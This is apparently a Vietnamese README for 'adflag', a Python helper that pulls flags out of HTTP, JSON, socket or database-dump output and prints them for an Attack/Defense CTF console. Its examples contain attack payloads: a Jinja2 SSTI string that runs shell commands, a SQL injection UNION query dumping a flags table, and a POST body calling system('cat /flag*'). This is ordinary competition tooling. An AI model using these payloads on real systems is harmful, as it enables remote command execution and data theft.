# adflag — Hướng dẫn sử dụng chi tiết theo từng trường hợp

Thư viện siêu nhẹ dành cho đồng đội chơi **Web, Crypto, Rev, Forensics, Misc** trong giải đấu Attack / Defense.

- ✅ **0 dependencies:** Không cần cài `pwntools`, không cần `pip install` (chỉ dùng thư viện chuẩn Python `sys`, `os`, `re`).
- ✅ **Nộp cờ tức thì (< 10ms):** Phát cờ chuẩn `[FLAG] <flag>` để Attack Console bắt và nộp sang server BTC ngay khi cờ vừa xuất hiện (không cần đợi script chạy xong).
- ✅ **Tự động bóc tách cờ:** Ném thẳng cả trang HTML, JSON, bytes, hoặc Database dump vào, thư viện tự regex tìm cờ sạch và nộp.
- ✅ **Tự nhận diện Target:** Tự lấy IP và Port khi Attack Console chạy nhiều luồng bắn nhiều team.

---

## 📌 Các trường hợp sử dụng thực tế

### Trường hợp 1: Web — Khai thác SSTI / LFI / RCE (Nhận về trang HTML dài)

* **Tình huống:** Gửi payload SSTI hoặc đọc file qua LFI, server trả về nguyên một trang HTML dài loằng ngoằng.
* **Trước đây:** Phải viết `re.findall(r'IBOH26_\w+', r.text)` hoặc in bừa ra stdout rồi hy vọng tool bắt được.
* **Với `adflag`:** Chỉ cần ném nguyên `r.text` vào `submit()`.

```python
#!/usr/bin/env python3
import requests
from adflag import submit, get_url

# get_url() tự lấy IP target và sinh URL: http://<target>:5000/render
url = get_url("/render", default_port=5000)

payload = "{{ cycler.__init__.__globals__.os.popen('cat /flag*').read() }}"
r = requests.get(url, params={"template": payload})

# Ném thẳng HTML response -> Tự tìm cờ và nộp ngay lập tức!
submit(r.text)
```

---

### Trường hợp 2: Web API — Nhận về JSON response (API / Graphql)

* **Tình huống:** Server trả về JSON dạng:
  ```json
  {"status": "ok", "data": {"user": "admin", "secret": "IBOH26_API_SECRET_98765"}}
  ```
* **Với `adflag`:** Truyền `r.json()` hoặc `r.text` đều được, thư viện tự đệ quy tìm cờ bên trong.

```python
#!/usr/bin/env python3
import requests
from adflag import submit, get_url

url = get_url("/api/profile", default_port=8080)
headers = {"X-Custom-Auth": "admin_token_bypass"}

r = requests.get(url, headers=headers)

# Truyền thẳng dict JSON vào:
submit(r.json())
```

---

### Trường hợp 3: Web SQLi — Dump toàn bộ Database chứa nhiều cờ

* **Tình huống:** Bắn SQL Injection dump được một danh sách chứa nhiều flag của nhiều round đấu hoặc nhiều user.
* **Với `adflag`:** Truyền một `list` các dicts/strings. Thư viện sẽ lọc từng cờ, **tự động khử trùng lặp** và phát ra Console từng cờ một.

```python
#!/usr/bin/env python3
import requests
from adflag import submit, get_url

url = get_url("/search", default_port=3000)
# Payload dump bảng notes:
r = requests.get(url, params={"q": "' UNION SELECT 1, user, flag_content FROM flags-- -"})

# Giả sử r.text chứa 10 flag khác nhau:
# "user1: IBOH26_FLAG_A, user2: IBOH26_FLAG_B, user3: IBOH26_FLAG_A (lặp)..."
submit(r.text)
# -> adflag sẽ tự phát 2 cờ duy nhất (FLAG_A, FLAG_B), bỏ qua cờ lặp!
```

---

### Trường hợp 4: Crypto / Pwn thô — Kết nối TCP Socket nhận raw bytes

* **Tình huống:** Kết nối socket thô qua `socket` hoặc `pwntools`, nhận về dạng `bytes` có chứa ký tự xuống dòng hoặc bytes string `b'IBOH26_xxxx\n'`.
* **Trước đây:** Nếu in thẳng `print(flag)` sẽ ra `b'IBOH26_...'` làm tool regex bị sai hoặc dính dấu ngoặc kép / newline.
* **Với `adflag`:** Tự decode utf-8 an toàn, cắt `\r\n`, loại bỏ `b'...'`.

```python
#!/usr/bin/env python3
import socket
from adflag import submit, get_target, get_port

# Tự nhận IP và Port của target:
host = get_target("127.0.0.1")
port = get_port(1337)

s = socket.create_connection((host, port))
s.sendall(b"GET_FLAG\n")
data = s.recv(1024) # data là bytes: b"Congratulations! Flag is: IBOH26_RAW_BYTES_8877\n"

# Ném thẳng bytes vào submit:
submit(data)
```

---

### Trường hợp 5: Reverse Engineering / Crypto Math — Đã giải ra chuỗi flag sạch

* **Tình huống:** Script Z3 / Sage / AES giải mã ra được biến `flag = "IBOH26_CLEAN_FLAG"`.

```python
#!/usr/bin/env python3
from adflag import submit

# Sau khi tính toán ra flag:
flag = "IBOH26_SOLVED_MATH_FLAG"

# Nộp 1 dòng:
submit(flag)

# Hoặc dùng callable module (cực ngắn):
# import adflag
# adflag(flag)
```

---

### Trường hợp 6: Giải đấu dùng format cờ lạ (Custom Regex)

* **Tình huống:** Mặc định `adflag` tự nhận diện `IBOH26_...` và `flag{...}`. Nếu giải đấu của bạn dùng định dạng khác, ví dụ `HCMUS{...}` hoặc `FLAG:[0-9a-f]{32}`:
* **Với `adflag`:** Chỉ cần truyền thêm tham số `regex=...`.

```python
#!/usr/bin/env python3
import requests
from adflag import submit, get_url

r = requests.get(get_url(default_port=80))

# Tuỳ biến pattern regex:
submit(r.text, regex=r"HCMUS{[^}]+}")
# Hoặc:
# submit(r.text, regex=r"FLAG:[0-9a-f]{32}")
```

---

### Trường hợp 7: Viết 1 script chạy được CẢ ở Local (Test) LẪN Attack Console (Tự động)

Khi đấu A/D, vấn đề khó chịu nhất là:
- Khi test trên máy: Target là `127.0.0.1` hoặc IP team đối thủ bạn đang nhắm tới (`10.10.2.1`).
- Khi đưa lên Attack Console: Console sẽ tự chạy script hàng loạt với từng IP target khác nhau của các team.

`adflag` giúp bạn giải quyết triệt để vấn đề này bằng các hàm:
- `get_target(default="127.0.0.1")`: Ưu tiên đọc `sys.argv[1]` $\rightarrow$ biến môi trường `TARGET_HOST` $\rightarrow$ giá trị mặc định.
- `get_port(default=80)`: Ưu tiên đọc `sys.argv[2]` $\rightarrow$ biến môi trường `TARGET_PORT` $\rightarrow$ giá trị mặc định.
- `get_url(path="", default_port=...)`: Tự động ráp lại thành URL hoàn chỉnh.

#### Mẫu chuẩn đa năng (Khuyên dùng cho toàn đội):

```python
#!/usr/bin/env python3
import requests
from adflag import submit, get_url

# 1. Khai báo URL với port mặc định của service (ví dụ 8080)
url = get_url("/api/exploit", default_port=8080)

# 2. Bắn payload
r = requests.post(url, json={"code": "system('cat /flag*')"})

# 3. Nộp cờ
submit(r.text)
```

#### Khi bạn chạy:
* **Test máy local:**
  ```bash
  python3 exploit.py
  # -> Target tự động là http://127.0.0.1:8080/api/exploit
  ```
* **Test 1 team cụ thể ngoài terminal:**
  ```bash
  python3 exploit.py 10.10.5.1
  # -> Target tự động là http://10.10.5.1:8080/api/exploit
  ```
* **Nạp vào Attack Console:**
  Console tự bắn target vào environment/argv. Script tự đổi target tương ứng từng team mà **bạn không cần sửa lại 1 ký tự nào trong code!**

---

## 📋 Bảng tra cứu hàm (Cheat Sheet)

| Hàm | Ví dụ gọi | Công dụng |
| :--- | :--- | :--- |
| `submit(data, regex=None)` | `submit(r.text)`<br>`submit(flag_bytes)`<br>`submit([f1, f2])` | Quét và phát toàn bộ cờ ra stdout theo chuẩn `[FLAG]`. Tự khử trùng lặp. |
| `adflag(data)` | `adflag(r.text)` | Alias của `submit()`. |
| `get_target(default)` | `host = get_target("127.0.0.1")` | Lấy host/IP của target hiện tại. |
| `get_port(default)` | `port = get_port(8080)` | Lấy port của service. |
| `get_url(path, default_port)`| `url = get_url('/flag', default_port=5000)` | Sinh `http://<target>:5000/flag`. |
| `find_flags(data, regex=None)`| `flags = find_flags(r.text)` | Chỉ trả về list cờ tìm thấy trong dữ liệu (không phát stdout). |
